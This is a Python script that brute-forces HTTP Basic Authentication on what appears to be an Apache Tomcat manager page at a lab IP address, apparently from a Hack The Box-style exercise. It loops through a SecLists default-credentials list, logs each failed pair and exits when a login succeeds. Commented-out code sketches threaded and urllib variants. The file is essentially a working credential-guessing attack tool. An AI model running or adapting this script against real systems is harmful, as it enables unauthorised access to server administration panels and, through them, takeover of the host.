import os, sys
import requests, requests.auth
import threading

from requests.sessions import default_headers
from functools import lru_cache

if sys.argv:
	
	if len(sys.argv) > 2:
		fname = sys.argv[1]
	else:
		_DIR = "/home/bane/Desktop/REPOS/SecLists/Passwords/Default-Credentials/"
		_FILE = "ALL.txt"
		fname = _DIR + _FILE
	
	if 'debug=False'in sys.argv:
		_DEBUG = False

	if len(sys.argv) > 3:
		target = sys.argv[2]
	else:
		target = 'http://10.129.97.164:8080/manager/html'




data_static = {
	"User-Agent": """Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
     	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36""",
	"Accept": """text/html,application/xhtml+xml,application/xml;q=0.9,\
		image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9""",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.9",
}

print('[INFO] : Using static data vars:')
print(data_static)


@lru_cache(maxsize=None)
def crack(debug:bool=True):
	with open(fname, 'r', encoding='utf8') as _file:
		
		#print(_file.__sizeof__()) # Debug line. Won't work in python < 3.8.
		file = _file.readlines()
		num = 0
  
		for c in file:
			
			try:
				num += 1
				creds = {}

				c = tuple(x.strip() for x in c.split(' ') if x)
				if len(c) <= 1: continue

				creds['user'] = c[0]
				creds['pass'] = c[1]
				user, pswd = creds['user'], creds['pass']
		
				res = requests.get(target, 
					auth = requests.auth.HTTPBasicAuth(user, pswd),
					headers=data_static)

				if debug and res.status_code == 401 : 
					print("\rWrong creds :", num, user,":",pswd, flush=False)
				if res.status_code == 200 : 
					print('Access granted.', user,":",pswd)
					sys.exit(0)
			
			except UnicodeEncodeError as e: # Deal with weird shite pls.
				if debug : print('[INFO] Decode error on '+pswd+":"+user)	

# threads = []
# if __name__ == "__main__":
# 	for _ in range(4):
# 		t = threading.Thread(target=crack())
# 		t.start()
# 		threads.append(t)

# 	for thread in threads:
# 		thread.join()

crack()
	# from multiprocessing import Process, Queue
	# queue = Queue()
	# procs = [Process(target=crack()) for x in range(4)]
	# for p in procs:
	# 	p.start()
	# for p in procs:
	# 	p.join()

	# import multiprocessing as mp
	# pool = mp.Pool(mp.cpu_count())
	# result = pool.map(crack())

    
     
     
     
     
     
		# print("USER :", creds['user'], "\t\tPWD :", creds['pass'])

		# auth = b64.b64encode(
      	# 	bytes(creds['user'].encode('utf8') + creds['pass']
        #     .encode('utf8'))).decode()

		# data_static['auth'] = auth

		# print(auth)


		# # # Dump the todo object as a json string
		# data = json.dumps(data_static)
		# try:
		# 	req = urllib.request.Request(url = target, 
        #     	data = bytes(data.encode("utf-8")), method = "POST")

		# 	req.add_header("Content-type", "application/json; charset=UTF-8")

		# 	with urllib.request.urlopen(req) as resp:
		# 		print(req.get_header.__code__())
		# 		response_data = json.loads(resp.read().decode("utf-8"))
		# 		print(response_data)
		# 		print("GOT SOMETHING HERE")
		# 		sys.exit(0)
		# 		#print(response_data.getcode())
		# except urllib.error.HTTPError as e:
		# 	if e.code == 401: print('Wrong creds')
		# 	else: print(e)